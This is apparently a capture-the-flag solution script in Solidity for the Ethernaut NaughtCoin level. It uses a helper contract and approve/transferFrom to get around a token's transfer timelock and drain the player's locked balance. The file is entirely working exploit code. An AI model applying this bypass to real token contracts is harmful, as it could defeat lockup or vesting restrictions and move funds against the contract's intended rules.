// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract Ex {
    function ex(NaughtCoin nc_, address _player, uint256 _token) external{
        nc_.transferFrom(_player, address(this), _token);
    }
}

contract NaughtCoinSol is Script {
    NaughtCoin public nc_ = NaughtCoin(0x5c9C1D4E73F026C282140706dC1a5F04cC7646a2);
    uint256 public token = nc_.INITIAL_SUPPLY();

    function run() external {
        vm.startBroadcast();

        console.log("Balances: ", nc_.balanceOf(msg.sender));
        Ex ex = new Ex();
        nc_.approve(address(ex), token);
        ex.ex(nc_, msg.sender, token);
        console.log("Balances: ", nc_.balanceOf(msg.sender));
        
        vm.stopBroadcast();
    }
}